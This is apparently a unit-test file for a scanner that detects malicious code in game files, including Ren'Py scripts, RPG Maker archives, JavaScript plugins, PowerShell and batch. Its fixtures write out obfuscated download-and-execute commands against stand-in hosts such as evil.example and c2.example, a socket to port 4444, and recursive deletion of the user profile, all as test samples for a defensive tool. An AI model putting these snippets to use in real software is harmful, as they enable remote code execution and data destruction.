    def fake_amsi(self, fail_open=False, fail_scan=False):
        from gamescan import defender
        mark, seen = self.MARK.encode("utf-16-le"), []

        class FakeAmsi(defender.Amsi):
            def _open(self, app_name):
                if fail_open:
                    raise OSError("no antimalware provider")

            def _scan_buffer(self, data, name):
                if fail_scan:
                    raise OSError("AmsiScanBuffer failed (0x80070015)")
                seen.append(name)
                return 32768 if mark in data else 1

        return FakeAmsi(), seen

    def rpyc(self, source):
        body = zlib.compress(pickle.dumps([source], 2))
        return b"RENPY RPC2" + struct.pack("<III", 1, 34, len(body)) + b"\0" * 12 + body

    def test_detected_content_becomes_a_critical_finding(self):
        amsi, seen = self.fake_amsi()
        s = Scanner(amsi=amsi)
        with tempfile.TemporaryDirectory() as tmp:
            os.makedirs(os.path.join(tmp, "game"))
            os.makedirs(os.path.join(tmp, "js", "plugins"))
            with open(os.path.join(tmp, "game", "hidden.rpyc"), "wb") as fh:
                fh.write(self.rpyc("x = '%s'" % self.MARK))
            with open(os.path.join(tmp, "game", "clean.rpyc"), "wb") as fh:
                fh.write(self.rpyc("renpy.pause(1.0)"))
            with open(os.path.join(tmp, "js", "plugins", "Bad.js"), "w") as fh:
                fh.write("var s = '%s';\n" % self.MARK)
            with open(os.path.join(tmp, "data.json"), "w") as fh:
                fh.write('{"note": "%s"}' % self.MARK)
            report = s.scan(tmp)
        hits = {f.file: f for f in report.findings if f.rule_id == "AMSI-001"}
        self.assertEqual(sorted(hits), ["game/hidden.rpyc", "js/plugins/Bad.js"])
        hit = hits["game/hidden.rpyc"]
        self.assertEqual((hit.severity, hit.suppressed), (Severity.CRITICAL, False))
        self.assertIn("hidden.rpyc", hit.evidence)                       # the source file
        self.assertIn("compiled Ren'Py script", hit.evidence)            # the content name
        self.assertIn("32768", hit.evidence)
        self.assertEqual(len(seen), 3, "one call per extracted item; JSON data is not submitted")
        self.assertTrue(any("game/hidden.rpyc" in name for name in seen))
        self.assertTrue(any("AMSI): 3 extracted item(s) checked" in n for n in report.notes))
        self.assertEqual(report.verdict, "DANGEROUS")

    def test_dotnet_metadata_is_submitted(self):
        amsi, seen = self.fake_amsi()
        system_dll = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.Http.dll"
        if not os.path.exists(system_dll):
            self.skipTest("needs the .NET Framework")
        Scanner(amsi=amsi, context=__import__("gamescan").ContextEngine(strict=True)).scan(system_dll)
        self.assertEqual(len(seen), 1)
        self.assertIn(".NET metadata", seen[0])

    def test_unavailable_amsi_is_an_info_note_and_the_scan_continues(self):
        for kwargs in ({"fail_open": True}, {"fail_scan": True}):
            amsi, _seen = self.fake_amsi(**kwargs)
            with tempfile.TemporaryDirectory() as tmp:
                with open(os.path.join(tmp, "a.rpyc"), "wb") as fh:
                    fh.write(self.rpyc("exec(base64.b64decode(x))  # %s" % self.MARK))
                report = Scanner(amsi=amsi).scan(tmp)
            self.assertTrue(any(n.startswith("INFO: the Windows antimalware engine (AMSI)")
                                for n in report.notes), kwargs)
            self.assertFalse([f for f in report.findings if f.rule_id == "AMSI-001"])
            self.assertTrue(active(report.findings, "PY-OBF-001"), "the normal rules still ran")
            self.assertEqual(report.errors, [])

    def test_amsi_can_be_switched_off(self):
        amsi, seen = self.fake_amsi()
        s = Scanner()                                      # amsi=False is the default
        s.scan_bytes("js/plugins/A.js", ("var s = '%s';" % self.MARK).encode())
        self.assertEqual(seen, [])
        self.assertIsNone(s.rules.amsi)

    def test_large_content_is_scanned_in_bounded_chunks(self):
        from gamescan import defender
        amsi, seen = self.fake_amsi()
        amsi.scan("a" * (30 * 1024 * 1024), "big")         # 60 MB as UTF-16
        self.assertEqual(len(seen), defender._MAX_CHUNKS)

    @unittest.skipUnless(os.environ.get("GSS_LIVE_DEFENDER") == "1",
                         "live Defender test (set GSS_LIVE_DEFENDER=1; shows in Windows Security)")
    def test_live_amsi_test_sample(self):
        from gamescan import defender
        amsi = defender.Amsi()
        self.assertTrue(amsi.available, amsi.problem)
        sample = "AMSI Test Sample: " + "7e72c3ce-861b-4339-8740-0ac1484c1386"
        self.assertGreaterEqual(amsi.scan(sample, "unit test"), defender.AMSI_DETECTED)
        self.assertLess(amsi.scan("print('hello')", "unit test"), defender.AMSI_DETECTED)

    # -- MpCmdRun -----------------------------------------------------------------
    THREAT_OUTPUT = (
        "Scan starting...\nScan finished.\nScanning C:\\Games\\Demo found 1 threats.\n\n"
        "<===========================LIST OF DETECTED THREATS==========================>\n"
        "----------------------------- Threat information ------------------------------\n"
        "Threat                  : Trojan:Win32/Demo.A\n"
        "Resources               : 1 total\n"
        "    file                : %s\n"
        "-------------------------------------------------------------------------------\n")

    def test_defender_scan_merges_threats_and_never_remediates(self):
        from gamescan import defender
        commands = []
        with tempfile.TemporaryDirectory() as tmp:
            bad = os.path.join(tmp, "bin", "evil.exe")
            os.makedirs(os.path.dirname(bad))
            with open(bad, "wb") as fh:
                fh.write(b"not really a program")

            def runner(command, timeout, cancel):
                commands.append(command)
                return 2, self.THREAT_OUTPUT % bad

            scan = defender.DefenderScan(exe="MpCmdRun.exe", runner=runner)
            report = Scanner(defender=scan).scan(tmp)
            self.assertTrue(os.path.exists(bad), "nothing is removed")
        self.assertEqual(commands, [["MpCmdRun.exe", "-Scan", "-ScanType", "3", "-File", tmp,
                                     "-DisableRemediation"]])
        hit = [f for f in report.findings if f.rule_id == "DEFENDER-001"]
        self.assertEqual([(f.file, f.severity, f.evidence) for f in hit],
                         [("bin/evil.exe", Severity.CRITICAL, "Trojan:Win32/Demo.A")])
        self.assertEqual(report.verdict, "DANGEROUS")

    def test_defender_scan_degrades_gracefully(self):
        from gamescan import defender
        cases = {
            "clean": lambda c, t, e: (0, "Scan starting...\nScan finished.\nfound no threats.\n"),
            "timeout": lambda c, t, e: (None, ""),
            "unsupported flag": lambda c, t, e: (2, "CmdTool: Failed with hr = 0x80070057.\n"),
            "cannot start": lambda c, t, e: (_ for _ in ()).throw(OSError("access denied")),
        }
        for name, runner in cases.items():
            with tempfile.TemporaryDirectory() as tmp:
                with open(os.path.join(tmp, "a.rpy"), "w") as fh:
                    fh.write("subprocess.Popen(cmd)\n")
                scan = defender.DefenderScan(exe="MpCmdRun.exe", runner=runner)
                report = Scanner(defender=scan).scan(tmp)
            self.assertFalse([f for f in report.findings if f.rule_id == "DEFENDER-001"], name)
            self.assertTrue(active(report.findings, "PY-PROC-001"), name)
            note = [n for n in report.notes if "Windows Defender scan" in n]
            self.assertEqual(len(note), 1, name)
            self.assertEqual(note[0].startswith("INFO:"), name != "clean", name)
        missing = defender.DefenderScan(exe="")
        self.assertEqual(missing.scan("C:\\x").status, "unavailable")
        calls = []
        runner = lambda c, t, e: (calls.append(c), (0, ""))[1]
        pc_wide = Scanner(defender=defender.DefenderScan(exe="MpCmdRun.exe", runner=runner))
        with tempfile.TemporaryDirectory() as tmp:
            report = pc_wide.scan([tmp, tmp + os.sep], label="Quick scan")
        self.assertEqual(calls, [], "not run for PC-wide scans")
        self.assertTrue(any(n.startswith("INFO: the Windows Defender scan is only run")
                            for n in report.notes))


class RgssTests(unittest.TestCase):
    """RPG Maker XP / VX / VX Ace, built from small synthetic archives."""

    # -- a tiny Ruby Marshal writer and the archive ciphers, for building fixtures --
    @staticmethod
    def m_int(n):
        if n == 0:
            return b"\0"
        if 0 < n < 123:
            return bytes([n + 5])
        raw = n.to_bytes((n.bit_length() + 7) // 8, "little")
        return bytes([len(raw)]) + raw

    def m_str(self, raw, ivar=False):
        body = b'"' + self.m_int(len(raw)) + raw
        return b"I" + body + self.m_int(1) + b":\x06ET" if ivar else body

    def scripts_file(self, scripts, ivar=False):
        rows = b""
        for number, (name, source) in enumerate(scripts):
            rows += (b"[" + self.m_int(3) + b"i" + self.m_int(1000 + number)
                     + self.m_str(name.encode(), ivar) + self.m_str(zlib.compress(source.encode())))
        return b"\x04\x08[" + self.m_int(len(scripts)) + rows

    @staticmethod
    def archive_v1(members):
        from gamescan.unpack import rgss
        out, key = bytearray(b"RGSSAD\0\x01"), 0xDEADCAFE
        step = lambda k: (k * 7 + 3) & 0xFFFFFFFF
        for name, data in members.items():
            raw = name.encode()
            out += struct.pack("<I", len(raw) ^ key)
            key = step(key)
            for b in raw:
                out.append(b ^ (key & 0xFF))
                key = step(key)
            out += struct.pack("<I", len(data) ^ key)
            key = step(key)
            out += rgss.encrypt_for_tests(data, key)
        return bytes(out)

    @staticmethod
    def archive_v3(members, seed=0x1234):
        from gamescan.unpack import rgss
        key = (seed * 9 + 3) & 0xFFFFFFFF
        index, blobs = bytearray(), bytearray()
        size_of_index = sum(16 + len(n.encode()) for n in members) + 16
        offset = 12 + size_of_index
        for number, (name, data) in enumerate(members.items()):
            raw, file_key = name.encode(), 0xABCDEF00 + number
            index += struct.pack("<IIII", offset ^ key, len(data) ^ key, file_key ^ key, len(raw) ^ key)
            index += bytes(b ^ ((key >> (8 * (i % 4))) & 0xFF) for i, b in enumerate(raw))
            blobs += rgss.encrypt_for_tests(data, file_key)
            offset += len(data)
        index += struct.pack("<IIII", key, key, key, key)        # offset 0 ends the table
        return b"RGSSAD\0\x03" + struct.pack("<I", seed) + bytes(index) + bytes(blobs)

    SCRIPTS = [("Game_Interpreter", "class Game_Interpreter\n  def run(s)\n    eval(s)\n  end\nend\n"),
               ("Bonus Loader", "# helper\nrequire 'net/http'\ndata = Net::HTTP.get(URI(u))\n"
                                "system(\"cmd /c \" + data)\n"),
               ("Fullscreen", "W = Win32API.new('user32', 'GetSystemMetrics', 'i', 'i')\n"),
               ("", "")]

    def test_all_three_archive_versions_are_unpacked(self):
        from gamescan.unpack import rgss
        import io
        members = {"Data\\Scripts.rvdata2": self.scripts_file(self.SCRIPTS, ivar=True),
                   "Graphics\\Titles\\title.png": b"\x89PNG" + b"\0" * 37,
                   "Data\\Map001.rvdata2": b"\x04\x08[\x06i\x06"}
        for label, blob in (("Game.rgssad", self.archive_v1(members)),
                            ("Game.rgss2a", self.archive_v1(members)),
                            ("Game.rgss3a", self.archive_v3(members))):
            entries = rgss.list_archive(io.BytesIO(blob))
            self.assertEqual([e.name for e in entries], [n.replace("\\", "/") for n in members], label)
            for entry, original in zip(entries, members.values()):
                self.assertEqual(rgss.read_entry(io.BytesIO(blob), entry, 1 << 20), original, label)
            found = Scanner().scan_bytes(label, blob)
            files = {f.file for f in active(found)}
            self.assertEqual(files, {label + "!Data/Scripts.rvdata2!002_Bonus Loader.rb"}, label)
            self.assertTrue(active(found, "RB-PROC-001"), label)
            self.assertTrue(active(found, "CHAIN-FETCHRUN"), label)

    def test_ruby_rules_and_false_positive_handling(self):
        s = Scanner()
        found = s.scan_bytes("Data/Scripts.rvdata2", self.scripts_file(self.SCRIPTS))
        by = {}
        for f in found:
            by.setdefault(f.rule_id, []).append(f)
        system = by["RB-PROC-001"][0]
        self.assertEqual((system.severity, system.line, system.suppressed), (Severity.HIGH, 4, False))
        self.assertFalse(by["RB-NET-001"][0].suppressed)
        self.assertTrue(by["RB-EXEC-001"][0].suppressed, "eval in the stock interpreter")
        self.assertIn("RPG Maker default script", by["RB-EXEC-001"][0].suppression_reason)
        self.assertTrue(by["RB-NATIVE-001"][0].suppressed)
        self.assertIn("helper API", by["RB-NATIVE-001"][0].suppression_reason)
        cases = {
            b"x = `whoami`\n": "RB-PROC-002",
            b"io = IO.popen('cmd')\n": "RB-PROC-001",
            b"out = %x{dir}\n": "RB-PROC-001",
            b"f = open(\"|calc\")\n": "RB-PROC-001",
            b"exec 'notepad'\n": "RB-PROC-001",
            b"eval(str.unpack('m')[0])\n": "RB-OBF-001",
            b"eval(Zlib::Inflate.inflate(blob))\n": "RB-OBF-002",
            b"api = Win32API.new('shell32', 'ShellExecuteA', 'pppppi', 'i')\n": "RB-NATIVE-002",
            b"s = TCPSocket.new(host, 80)\n": "RB-NET-001",
            b"FileUtils.rm_rf(ENV['USERPROFILE'])\n": "RB-FS-001",
        }
        for source, rule in cases.items():
            self.assertTrue(active(s.scan_bytes("lib/a.rb", source), rule), (source, rule))
        harmless = (b"=begin\nsystem('x') and eval(y) are only described here\n=end\n"
                    b"# system(\"never\")\n$data_system = load_data('Data/System.rvdata2')\n"
                    b"def system(x)\n  @system = x\nend\nSound.play_system_sound(1)\n")
        self.assertFalse(active(s.scan_bytes("lib/b.rb", harmless)))
        keys = b"K = Win32API.new('user32', 'GetAsyncKeyState', 'i', 'i')\n"
        self.assertFalse(active(s.scan_bytes("lib/c.rb", keys)), "in-game keyboard input")

    def test_event_script_commands_in_other_data_files(self):
        blob = b"\x04\x08" + b"\x00" * 9 + b"system(\"cmd /c del /s /q C:\\\\x\")" + b"\x00" * 9
        self.assertTrue(active(Scanner().scan_bytes("Data/Map001.rxdata", blob), "RB-PROC-001"))

    def test_marshal_reader_rejects_everything_else(self):
        from gamescan.unpack import rgss
        good = self.scripts_file([("A", "x = 1\n")])
        self.assertEqual(rgss.load_scripts(good), [("A", "x = 1\n")])
        bad = {
            "ruby object": b"\x04\x08o:\x08Foo\x00",
            "user-defined dump": b"\x04\x08u:\x08Foo\x06x",
            "float": b"\x04\x08f\x061",
            "wrong version": b"\x04\x09[\x00",
            "not a table": b"\x04\x08i\x06",
            "row is not a list": b"\x04\x08[\x06i\x06",
            "huge array": b"\x04\x08[\x04\xff\xff\xff\x7f",
            "truncated": good[:-5],
            "bad link": b"\x04\x08[\x06@\x7f",
        }
        for name, blob in bad.items():
            with self.assertRaises(rgss.RgssError, msg=name):
                rgss.load_scripts(blob)
        deep = b"\x04\x08" + b"[\x06" * 50 + b"0"
        with self.assertRaises(rgss.RgssError):
            rgss.load_scripts(deep)
        found = Scanner().scan_bytes("Data/Scripts.rxdata", bad["ruby object"])
        self.assertEqual([f.rule_id for f in found], ["RGSS-FMT-001"])

    def test_limits(self):
        from gamescan.unpack import rgss
        import io
        bomb = (b"\x04\x08[\x06[\x08i\x06" + self.m_str(b"big")
                + self.m_str(zlib.compress(b"\0" * (rgss.MAX_SCRIPT + 1024), 9)))
        with self.assertRaises(rgss.RgssError):
            rgss.load_scripts(bomb)
        with self.assertRaises(rgss.RgssError):                     # entry past the end
            rgss.list_archive(io.BytesIO(self.archive_v1({"a.rb": b"x" * 64})[:-10]))
        entry = rgss.list_archive(io.BytesIO(self.archive_v1({"a.rb": b"x" * 64})))[0]
        with self.assertRaises(rgss.RgssError):
            rgss.read_entry(io.BytesIO(self.archive_v1({"a.rb": b"x" * 64})), entry, limit=10)
        broken = Scanner().scan_bytes("Game.rgss3a", b"RGSSAD\0\x03" + b"\x01" * 10)
        self.assertEqual([f.rule_id for f in broken], ["RGSS-FMT-002"])
        self.assertEqual([f.rule_id for f in Scanner().scan_bytes("G.rgssad", b"RGSSAD\0\x09")],
                         ["RGSS-FMT-002"])

    def test_engine_detection_and_amsi_for_ruby(self):
        amsi, seen = DefenderTests().fake_amsi()
        with tempfile.TemporaryDirectory() as tmp:
            os.makedirs(os.path.join(tmp, "Data"))
            with open(os.path.join(tmp, "Game.rgss3a"), "wb") as fh:
                fh.write(self.archive_v3({"Data\\Scripts.rvdata2": self.scripts_file(
                    [("Evil", "x = '%s'\n" % DefenderTests.MARK)], ivar=True)}))
            report = Scanner(amsi=amsi).scan(tmp)
        self.assertEqual(report.engines, ["RPG Maker VX Ace"])
        hit = [f for f in report.findings if f.rule_id == "AMSI-001"]
        self.assertEqual([f.file for f in hit], ["Game.rgss3a!Data/Scripts.rvdata2!001_Evil.rb"])
        self.assertIn("Ruby script", seen[0])


class PayloadResolutionTests(unittest.TestCase):
    """Data-flow analysis: the value that really reaches exec / the shell / the network."""

    def setUp(self):
        self.s = Scanner()

    def resolve(self, text, language):
        from gamescan import dataflow
        result = dataflow.analyse(text, language)
        self.assertEqual(result.error, "")
        return result

    def values(self, text, language, kind):
        return [h.value for h in self.resolve(text, language).resolved if h.kind == kind]

    # -- Python ------------------------------------------------------------------
    def test_python_url_is_traced_through_variables_and_a_function_call(self):
        src = ('import os\nhost = "evil" + ".example"\nurl = "http://" + host + "/p.exe"\n'
               'def fetch(u, dest):\n    import urllib.request\n'
               '    urllib.request.urlretrieve(u, dest)\n'
               'fetch(url, os.path.join(os.environ["TEMP"], "x.exe"))\n')
        found = self.s.scan_bytes("game/a.py", src.encode())
        url = active(found, "DF-URL-001")
        self.assertEqual(len(url), 1)
        self.assertEqual(url[0].snippet, "http://evil.example/p.exe")
        self.assertEqual(url[0].line, 6)
        self.assertIn("urllib.request.urlretrieve receives: http://evil.example/p.exe",
                      url[0].evidence)

    def test_python_command_built_from_character_codes(self):
        src = ('import os\nk = [chr(c ^ 7) for c in [119, 104, 112, 98, 117, 116, 111, 98, 107, 107]]\n'
               'os.system("".join(k) + " -w hidden")\n')
        cmd = active(self.s.scan_bytes("game/a.py", src.encode()), "DF-CMD-001")
        self.assertEqual(len(cmd), 1)
        self.assertEqual(cmd[0].snippet, "powershell -w hidden")
        self.assertEqual(cmd[0].severity, Severity.HIGH)
        self.assertIn("[decoded]", cmd[0].evidence)
        self.assertIn("k <- line 2", cmd[0].evidence)

    def test_python_payload_decoded_on_one_line_and_executed_on_another(self):
        inner = b"import os\nos.system('calc.exe')"
        src = 'import base64\np = base64.b64decode("%s")\nexec(p)\n' % base64.b64encode(inner).decode()
        found = self.s.scan_bytes("game/a.rpy", ("init python:\n" + "".join(
            "    " + line + "\n" for line in src.splitlines())).encode())
        code = active(found, "DF-EXEC-001")
        self.assertEqual(len(code), 1)
        self.assertEqual(code[0].severity, Severity.HIGH)
        self.assertEqual(code[0].line, 4)
        self.assertIn("os.system('calc.exe')", code[0].snippet)
        # the hidden code is analysed like any other: the command inside it is found too
        inside = active(found, "DF-CMD-001")
        self.assertEqual([f.snippet for f in inside], ["calc.exe"])
        self.assertIn("[inside decoded code]", inside[0].evidence)
        hidden_rule = [f for f in found if f.rule_id == "PY-PROC-001" and "decoded at line 4" in f.evidence]
        self.assertEqual(len(hidden_rule), 1, "ordinary rules run over the decoded code")

    def test_python_function_looked_up_by_assembled_name(self):
        src = ('import os\ngetattr(os, "sys" + "tem")("whoami")\n'
               'm = __import__("sub" + "process")\nm.call("cmd /c " + "dir")\n')
        found = self.s.scan_bytes("game/a.py", src.encode())
        self.assertEqual(sorted(f.snippet for f in active(found, "DF-CALL-001")),
                         ["os.system", "subprocess"])
        self.assertEqual(sorted(f.snippet for f in active(found, "DF-CMD-001")),
                         ["cmd /c dir", "whoami"])

    def test_python_unknown_parts_are_shown_as_holes_not_guessed(self):
        src = ('import os, requests\nclass A:\n    def __init__(self):\n'
               '        self.u = "https://{}/{}".format("c2.example", "gate")\n'
               '    def go(self, extra):\n        requests.get(self.u + extra)\n'
               '        os.remove(os.path.expanduser("~/Documents/") + extra)\n')
        found = self.s.scan_bytes("game/a.py", src.encode())
        url = active(found, "DF-URL-001")[0]
        self.assertEqual(url.snippet, "https://c2.example/gate\u2039extra\u203a")
        self.assertIn("only known at runtime", url.evidence)
        path = active(found, "DF-PATH-001")[0]
        self.assertEqual(path.snippet, "%USERPROFILE%/Documents/\u2039extra\u203a")
        self.assertEqual(path.severity, Severity.HIGH, "the deletion check sees the resolved target")

    def test_python2_and_renpy_statements_are_understood(self):
        packed = base64.b64encode(zlib.compress(
            b"import socket\ns=socket.socket()\ns.connect(('45.9.8.7', 4444))")).decode()
        src = ('label start:\n    "hello"\n    $ site = "http://91.1.2.3"\ninit python:\n'
               '    import urllib2\n    def beacon():\n        print "calling"\n'
               '        urllib2.urlopen(site + "/gate.php")\n'
               '    exec zlib.decompress(base64.b64decode("%s"))\n' % packed)
        found = self.s.scan_bytes("game/a.rpy", src.encode())
        self.assertEqual(sorted(f.snippet for f in active(found, "DF-URL-001")),
                         ["http://91.1.2.3/gate.php", "tcp://45.9.8.7:4444"])
        self.assertTrue(all(f.severity == Severity.HIGH for f in active(found, "DF-URL-001")),
                        "raw IP addresses")

    def test_plain_literals_and_ordinary_game_code_stay_quiet(self):
        src = ('import os, subprocess\nos.system("notepad readme.txt")\nexec("x = 1")\n'
               'value = eval("persistent." + name)\n'
               'subprocess.Popen([renpy.config.basedir])\n'
               'f = open(os.path.join(config.savedir, "log.txt"), "w")\n'
               'os.remove(os.path.join(config.savedir, name + ".save"))\n')
        found = self.s.scan_bytes("game/a.py", src.encode())
        self.assertEqual([f.rule_id for f in active(found) if f.rule_id.startswith("DF-")], [])
        kept = [f for f in found if f.rule_id == "DF-PATH-001"]
        self.assertEqual(len(kept), 1)
        self.assertIn("save / cache / temp", kept[0].suppression_reason)

    def test_everyday_dynamic_code_seen_in_real_games_is_not_reported(self):
        src = ('import urllib, webbrowser\nenabled = "config.allow_skipping and not main_menu"\n'
               'if eval(enabled):\n    pass\n'
               'style = renpy.store.style\nbox = getattr(style, "say_" + "vbox")\n'
               'def get(url):\n    urllib.urlretrieve(url + ".sig", "x")\n'
               'webbrowser.open("call_in_new_context:" + target)\n')
        result = self.resolve(src, "python")
        self.assertEqual([(h.kind, h.value) for h in result.resolved], [])
        host = ('import http.client\nh = "c2." + "example"\nc = http.client.HTTPSConnection(h)\n')
        self.assertEqual(self.values(host, "python", "url"), ["https://c2.example"])

    def test_benign_domain_applies_to_resolved_addresses(self):
        src = 'import urllib.request\nbase = "https://www." + "renpy.org"\nurllib.request.urlopen(base + "/v")\n'
        found = self.s.scan_bytes("game/a.py", src.encode())
        self.assertEqual(active(found, "DF-URL-001"), [])
        self.assertIn("renpy.org", suppressed(found, "DF-URL-001")[0].suppression_reason)

    def test_scanned_code_is_never_executed(self):
        marker = os.path.join(tempfile.gettempdir(), "gss_must_not_exist_%d" % os.getpid())
        src = ('import os\nopen(%r, "w").write("x")\n__import__("os").mkdir(%r)\n'
               'exec("open(%r, \'w\')")\nclass X:\n    def __format__(self, s):\n'
               '        open(%r, "w")\n        return ""\n"{}".format(X())\n'
               % (marker, marker, marker, marker))
        self.s.scan_bytes("game/a.py", src.encode())
        self.assertFalse(os.path.exists(marker))

    def test_resolver_is_bounded(self):
        import time
        from gamescan import dataflow
        hostile = [
            'import os\nx = "a" * 10**12\nos.system(x)\n',
            'import os\nx = "%999999999d" % 1\nos.system(x)\n',
            'import os\nx = "{:>999999999}".format("a")\nos.system(x)\n',
            'import os\nwhile True:\n    os.system("a" + "b")\n',
            'import os\ns = "ab"\nfor i in range(60):\n    s = s + s\nos.system(s)\n',
            'import os\ndef f(n):\n    return f(n + 1) + f(n + 2)\nos.system(f(1))\n',
            'import os\nx = 2 ** 2 ** 2 ** 2 ** 2 ** 2\nos.system(str(x))\n',
            'import os, zlib\nos.system(zlib.decompress(%r))\n' % zlib.compress(b"\0" * 50_000_000),
            'import os\nos.system(' + "(" * 5000 + '"x"' + ")" * 5000 + ')\n',
            'import os\nos.system(' + "-" * 50000 + '1)\n',
        ]
        for src in hostile:
            started = time.time()
            result = dataflow.analyse(src, "python")
            self.assertEqual(result.error, "", src[:40])
            self.assertLess(time.time() - started, 6, src[:40])
            self.assertTrue(all(len(h.value) <= 4000 for h in result.resolved))
        started = time.time()
        js = "var a = 'x';\n" + "a = a + a;\n" * 200 + "eval(a + atob('eA=='));\n" + "eval(" * 3000
        self.assertEqual(dataflow.analyse(js, "js").error, "")
        self.assertLess(time.time() - started, 6)

    # -- JavaScript ------------------------------------------------------------------
    def test_js_command_is_traced_and_decoded(self):
        src = ("var cp = require('child_process');\nvar parts = ['power', 'shell'];\n"
               "var cmd = parts.join('') + ' -nop -c \"' + atob('aXdyIGh0dHA6Ly9ldmlsLmV4YW1wbGUvYQ==') + '\"';\n"
               "cp.exec(cmd);\n")
        found = self.s.scan_bytes("www/js/plugins/a.js", src.encode())
        cmd = active(found, "DF-CMD-001")
        self.assertEqual([f.snippet for f in cmd], ['powershell -nop -c "iwr http://evil.example/a"'])
        self.assertEqual(cmd[0].line, 4)
        self.assertIn("cmd <- line 3", cmd[0].evidence)
        # destructured import, template literal, and a variable that is a parameter elsewhere
        src = ("const { execSync } = require('child_process');\nconst tool = 'cert' + 'util';\n"
               "function other(target) { return target; }\n"
               "const target = `${tool} -urlcache -f http://evil.example/p.exe p.exe`;\n"
               "execSync(target);\n")
        found = self.s.scan_bytes("www/js/plugins/b.js", src.encode())
        self.assertEqual([f.snippet for f in active(found, "DF-CMD-001")],
                         ["certutil -urlcache -f http://evil.example/p.exe p.exe"])

    def test_js_hidden_eval_payload_and_computed_call(self):
        inner = base64.b64encode(b"require('child_process').exec('calc')").decode()
        src = ('var p = atob("%s");\neval(p);\nvar x = "lave".split("").reverse().join("");\n'
               'window[x]("1");\nvar u = "h" + "ttp://evil.example/" + String.fromCharCode(97, 98);\n'
               'fetch(u);\n' % inner)
        found = self.s.scan_bytes("www/js/plugins/a.js", src.encode())
        self.assertEqual([f.snippet for f in active(found, "DF-EXEC-001")],
                         ["require('child_process').exec('calc')"])
        self.assertEqual([f.snippet for f in active(found, "DF-CMD-001")], ["calc"])
        self.assertEqual([f.snippet for f in active(found, "DF-CALL-001")], ["eval"])
        self.assertEqual([f.snippet for f in active(found, "DF-URL-001")], ["http://evil.example/ab"])
        self.assertTrue([f for f in found if f.rule_id == "JS-PROC-001" and "decoded at line 2" in f.evidence])

    PLUGIN = ("Graphics._openUrl = function(url) {\n    if (!Utils.isNwjs()) { window.open(url); return; }\n"
              "    var exec = require('child_process').exec;\n    switch (process.platform) {\n"
              "        case 'win32':\n"
              "            exec('rundll32.exe url.dll,FileProtocolHandler \"' + url + '\"');\n"
              "            break;\n        default:\n            exec('open \"' + url + '\"');\n"
              "            break;\n    }\n};\n")

    def test_plugin_that_only_opens_a_web_page_is_not_alarming(self):
        found = self.s.scan_bytes("www/js/plugins/CustomizeErrorScreen.js", self.PLUGIN.encode())
        self.assertEqual([f.rule_id for f in active(found) if f.severity >= Severity.MEDIUM], [])
        for rule_id in ("JS-PROC-001", "LOL-001", "DF-CMD-001"):
            hits = suppressed(found, rule_id)
            self.assertTrue(hits, rule_id)
            self.assertIn("web address", hits[0].suppression_reason)
        shown = suppressed(found, "DF-CMD-001")[0]
        self.assertEqual(shown.snippet, 'rundll32.exe url.dll,FileProtocolHandler "\u2039url\u203a"')

    def test_open_a_web_page_does_not_hide_another_command(self):
        for extra in ("    exec('cmd /c ' + url);\n",                       # a second, different command
                      "    exec(somethingElse);\n",                         # a command that cannot be read
                      "    require('child_process')['ex' + 'ec']('calc');\n",   # not through the alias
                      "    var run = exec; run('calc');\n"):                # the alias is passed on
            src = self.PLUGIN.replace("    switch (process.platform) {", extra + "    switch (process.platform) {")
            found = self.s.scan_bytes("www/js/plugins/a.js", src.encode())
            self.assertTrue(active(found, "JS-PROC-001"), extra)
        # a fixed local program instead of an address is not "opening a web page"
        src = self.PLUGIN.replace("'rundll32.exe url.dll,FileProtocolHandler \"' + url + '\"'",
                                  "'rundll32.exe url.dll,FileProtocolHandler ' + 'C:/x/evil.exe'")
        found = self.s.scan_bytes("www/js/plugins/a.js", src.encode())
        self.assertTrue(active(found, "LOL-001") and active(found, "JS-PROC-001") and active(found, "DF-CMD-001"))
        strict = Scanner(strict=True).scan_bytes("www/js/plugins/a.js", self.PLUGIN.encode())
        self.assertTrue(suppressed(strict, "JS-PROC-001"), "a context decision, not a baseline")

    # -- Ruby, PowerShell, batch ------------------------------------------------------
    def test_ruby_payloads(self):
        src = ('code = "c3lzdGVtKCdjYWxjJyk=".unpack(\'m\')[0]\neval(code)\n'
               'cmd = "cmd /c " + "whoami"\nsystem cmd\n'
               'host = [101,118,105,108].pack(\'c*\') + ".example"\n'
               'Net::HTTP.get(URI("http://" + host + "/x"))\n'
               'api = Win32API.new("ker" + "nel32", "Win" + "Exec", \'pi\', \'i\')\n'
               '`ping #{host}`\n')
        found = self.s.scan_bytes("Scripts/a.rb", src.encode())
        self.assertEqual([f.snippet for f in active(found, "DF-EXEC-001")], ["system('calc')"])
        self.assertEqual(sorted(f.snippet for f in active(found, "DF-CMD-001")),
                         ["calc", "cmd /c whoami", "ping evil.example"])
        self.assertEqual([f.snippet for f in active(found, "DF-URL-001")], ["http://evil.example/x"])
        call = active(found, "DF-CALL-001")
        self.assertEqual([f.snippet for f in call], ["kernel32!WinExec"])
        self.assertEqual(call[0].severity, Severity.HIGH)
        self.assertFalse(any(f.context.get("in_comment") for f in found if f.rule_id == "RB-PROC-002"),
                         "#{...} inside backticks is not a comment")

    def test_powershell_variables_and_encoded_command(self):
        script = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
        enc = base64.b64encode(script.encode("utf-16-le")).decode()
        src = ("$u = 'http://evil.' + 'example/a'\nInvoke-WebRequest -Uri $u -OutFile x.exe\n"
               "$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2hvYW1p'))\n"
               "Invoke-Expression $s\npowershell -nop -enc %s\n" % enc)
        found = self.s.scan_bytes("tools/a.ps1", src.encode())
        self.assertEqual(sorted(f.snippet for f in active(found, "DF-URL-001")),
                         ["http://evil.example/a", "http://evil.example/a.ps1"])
        self.assertEqual(sorted(f.snippet for f in active(found, "DF-EXEC-001")), [script, "whoami"])
        # the same decoding applies when another language starts PowerShell
        py = 'import os\nos.system("powershell -w hidden -enc %s")\n' % enc
        found = self.s.scan_bytes("game/a.py", py.encode())
        self.assertEqual([f.snippet for f in active(found, "DF-EXEC-001")], [script])

    def test_batch_variables_are_expanded(self):
        src = ("@echo off\r\nset a=pow\r\nset b=ershell\r\nset u=http://evil.example/x\r\n"
               "%a%%b% -c \"iwr %u% -OutFile x.exe\"\r\nset DIR=%~dp0\r\ncd %DIR%\r\n")
        found = self.s.scan_bytes("run.bat", src.encode())
        cmd = active(found, "DF-CMD-001")
        self.assertEqual([f.snippet for f in cmd], ['powershell -c "iwr http://evil.example/x -OutFile x.exe"'])
        self.assertEqual(cmd[0].line, 5)
